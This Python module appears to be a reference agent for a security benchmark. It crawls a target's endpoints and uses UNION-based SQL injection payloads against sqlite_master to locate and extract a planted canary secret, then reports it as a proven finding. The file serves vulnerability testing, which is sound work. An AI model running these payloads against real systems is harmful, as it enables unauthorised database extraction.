"""A reference miner agent: a deterministic SQL-injection solver.

This is the kind of file a miner submits to the marketplace admission gate - a
single module defining `agent_main(ctx) -> list[Finding]`. It is intentionally
small, dependency-free, and NOT LLM-driven, so the validator can use it to prove
the Python-script harness end to end. A competitive miner's agent is far broader
(many categories, LLM-reasoned, browser recon); the contract is identical.

How it earns the finding (the benchmark's rules, see targets/sqli_v1/app.py):

  * It does NOT guess endpoints - it crawls the advertised surface (the index
    page + /openapi.json), which lists the real endpoint among plausible decoys.
  * It does NOT flag "an error appeared" - the benchmark plants an error-trap
    decoy precisely to punish that. The ONLY thing that counts is pulling the
    per-run canary out, which is reachable only through a genuine UNION injection.
  * It reads the LIVE schema (sqlite_master) to find the per-run-randomized secret
    table/column - a memorised name is useless - then UNION-selects the canary.
  * It returns the exploit as PROOF (`payload` + the extracted `canary`), so the
    validator replays that exact payload against a fresh canary and re-extracts
    it. A hardcoded or guessed canary cannot survive that replay.
"""

from __future__ import annotations

import json
import re

from secqurityVali.agent_sdk.context import Finding

# The common query-param pool the benchmark advertises; the real injectable
# parameter is one of these, identical across every endpoint so the surface never
# singles the flaw out.
_PARAMS = ("q", "id", "name", "filter", "query", "search")

# Two injection contexts the union variant exposes: a quoted `LIKE '%...%'` string
# or a bare numeric comparison. Each entry is (label, breakout-prefix, comment).
# The prefix closes the original predicate so our UNION stands alone; the comment
# swallows the trailing original SQL.
_BREAKOUTS = (
    ("string", "zzq%'", "-- -"),   # ... LIKE '%zzq%' <our UNION> -- -%'
    ("numeric", "-1", "-- -"),     # ... id = -1 <our UNION> -- -
)


def _discover_endpoints(ctx) -> list[str]:
    """Crawl the index + OpenAPI spec and return the advertised endpoints
    (deduped, discovery surfaces themselves removed)."""
    eps: set[str] = set()
    for path in ("/", "/openapi.json"):
        try:
            r = ctx.http("GET", path, authenticated=False)
        except Exception:  # noqa: BLE001 - a dead discovery path is not fatal
            continue
        text = r.text
        try:                                   # OpenAPI paths
            spec = json.loads(text)
            for p in (spec.get("paths") or {}):
                if isinstance(p, str) and p.startswith("/"):
                    eps.add(p)
        except Exception:  # noqa: BLE001 - not JSON, fall through to HTML
            pass
        for href in re.findall(r'href="([^"]+)"', text):   # HTML links
            p = href.split("?", 1)[0]
            if p.startswith("/"):
                eps.add(p)
    eps.discard("/")
    eps.discard("/openapi.json")
    eps.discard("/health")
    return sorted(eps)


def _rows(resp_text: str):
    """The `results` array from a target response, or None if this response
    carried none (an error, an empty decoy, or non-JSON)."""
    try:
        data = json.loads(resp_text)
    except Exception:  # noqa: BLE001
        return None
    rows = data.get("results") if isinstance(data, dict) else None
    return rows if isinstance(rows, list) else None


def _probe(ctx, ep: str, param: str, value: str):
    """GET ep?param=value and return its parsed `results` (or None)."""
    try:
        r = ctx.http("GET", ep, params={param: value}, authenticated=False)
    except Exception:  # noqa: BLE001
        return None
    return _rows(r.text)


def _find_secret_schema(ctx, ep, param, prefix, comment):
    """UNION-read sqlite_master and return (table, column) of the per-run secret
    table, or None if this (endpoint, param, context) is not genuinely injectable
    (a safe decoy or the error-trap returns no injected rows). The base query
    selects three columns (id, name, price), so our UNION selects three too."""
    payload = (f"{prefix} UNION SELECT 1, name, sql "
               f"FROM sqlite_master WHERE type='table' {comment}")
    rows = _probe(ctx, ep, param, payload)
    if not rows:
        return None
    secret_table = None
    secret_sql = None
    for row in rows:
        # our injected rows look like [1, <table_name>, <create_sql>]
        if not isinstance(row, (list, tuple)) or len(row) < 3:
            continue
        name, create_sql = row[1], row[2]
        if not isinstance(name, str) or not isinstance(create_sql, str):
            continue
        if name == "products" or name.startswith("sqlite_"):
            continue
        secret_table, secret_sql = name, create_sql
        break
    if not secret_table:
        return None
    # the secret column is the non-id column declared in the CREATE statement
    cols = re.findall(r'"([^"]+)"|\b([a-zA-Z_]\w*)\b', secret_sql)
    names = [a or b for (a, b) in cols]
    secret_col = next(
        (c for c in names
         if c.lower() not in ("create", "table", "integer", "text", "id",
                              secret_table.lower())),
        None,
    )
    return (secret_table, secret_col) if secret_col else None


def _extract_canary(ctx, ep, param, prefix, comment, table, column):
    """UNION-select the secret column and return (canary, payload)."""
    payload = f'{prefix} UNION SELECT 1, "{column}", 1 FROM "{table}" {comment}'
    rows = _probe(ctx, ep, param, payload)
    if not rows:
        return None
    for row in rows:
        if isinstance(row, (list, tuple)) and len(row) >= 2 and isinstance(row[1], str):
            if row[1] not in ("1", "name", "products"):
                return row[1], payload
    return None


def _try_endpoint_param(ctx, ep: str, param: str):
    """Attempt a full extract on one (endpoint, param). Returns a proven Finding
    or None."""
    for _label, prefix, comment in _BREAKOUTS:
        schema = _find_secret_schema(ctx, ep, param, prefix, comment)
        if not schema:
            continue
        table, column = schema
        got = _extract_canary(ctx, ep, param, prefix, comment, table, column)
        if not got:
            continue
        canary, payload = got
        ctx.log(f"sqli: extracted canary from {ep}?{param} via {_label} union")
        return Finding(
            category="sqli",
            severity="critical",
            title="SQL injection: database contents extracted",
            endpoint=ep,
            parameter=param,
            detail=(f"The `{param}` parameter on {ep} concatenates input into a "
                    f"SQL query. A UNION injection read the live schema "
                    f'(secret table "{table}") and extracted its contents.'),
            evidence=f"extracted secret value: {canary}",
            method="GET",
            location="query",
            value="widget",
            payload=payload,
            canary=canary,
            confidence="proven",
        )
    return None


def agent_main(ctx):
    """Entry point the sandbox calls. Returns the vulnerabilities PROVEN."""
    findings: list[Finding] = []
    for ep in _discover_endpoints(ctx):
        for param in _PARAMS:
            hit = _try_endpoint_param(ctx, ep, param)
            if hit:
                findings.append(hit)
                return findings     # one proven critical is enough for the gate
    return findings
